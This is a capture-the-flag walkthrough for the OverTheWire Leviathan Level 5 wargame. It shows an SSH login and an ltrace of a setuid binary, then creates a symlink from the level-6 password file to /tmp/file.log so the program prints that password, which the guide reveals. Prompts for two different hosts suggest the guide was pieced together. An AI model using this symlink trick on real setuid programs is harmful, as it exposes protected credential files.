# OverTheWire - Leviathan Level 5 Setup Guide

This guide explains how to complete **Leviathan Level 5** and retrieve the password for **Level 6**.

## Prerequisites

Before you begin, ensure you have the following:

1. **An active internet connection**.
2. **SSH client** installed (typically available on most Linux distributions and macOS by default).
3. **sshpass** installed (for automating SSH logins with a password).
   - To install `sshpass` on Kali Linux, use the following:
     ```bash
     sudo apt-get install sshpass
     ```
   - On macOS, use `brew`:
     ```bash
     brew install sshpass
     ```

## Steps to Connect to Leviathan Level 5

1. **Open a terminal**: If you're on Linux or macOS, open a terminal window. On Windows, you may need an SSH client like `PuTTY` or use the Windows Subsystem for Linux (WSL).

2. **Use `sshpass` to log in**: The username for **Level 5** is `leviathan5`, and the password is the one you retrieved from **Level 4**. Use the following command to log in via SSH:

    ```bash
    sshpass -p <password_from_level_4> ssh leviathan5@leviathan.labs.overthewire.org -p 2223
    ```

   Replace `<password_from_level_4>` with the password you found in Level 4.

3. **Confirm the host authenticity**: When connecting for the first time, you might see the following prompt:
   
    ```text
    The authenticity of host '[leviathan.labs.overthewire.org]:2223 ([13.48.119.24]:2223)' can't be established.
    ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
    Are you sure you want to continue connecting (yes/no/[fingerprint])?
    ```

   Type `yes` to continue and add the host to the list of known hosts.

4. **Enter the password**: After entering the `sshpass` command, you should be logged in to the server. If you're not using `sshpass`, the server will prompt you for the password you retrieved from Level 4.

5. **You're in!**: Once logged in, you should see a welcome message and the prompt for the `leviathan5` user:
   
    ```bash
    leviathan5@gibson:~$
    ```

6. **Check who you are**: To verify your current user, run the following command:
   
    ```bash
    whoami
    ```

## Initial Directory Listing

```sh
leviathan5@melinda:~$ ls -la
total 28
drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-r-sr-x---   1 leviathan6 leviathan5 7634 Nov 14  2014 leviathan5
```

## Running the Executable

```sh
leviathan5@melinda:~$ ./leviathan5
Cannot find /tmp/file.log
```

## Tracing the Program Execution

```sh
leviathan5@melinda:~$ ltrace ./leviathan5
__libc_start_main(0x80485ed, 1, 0xffffd794, 0x8048690 <unfinished ...>
fopen("/tmp/file.log", "r")                      = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
```

## Creating Symbolic Link

```sh
leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
```

## Running the Executable Again

```sh
leviathan5@melinda:~$ ./leviathan5
UgaoFee4li
```

And there you have it! The password for Leviathan Level 6 is UgaoFee4li. On to the next challenge!
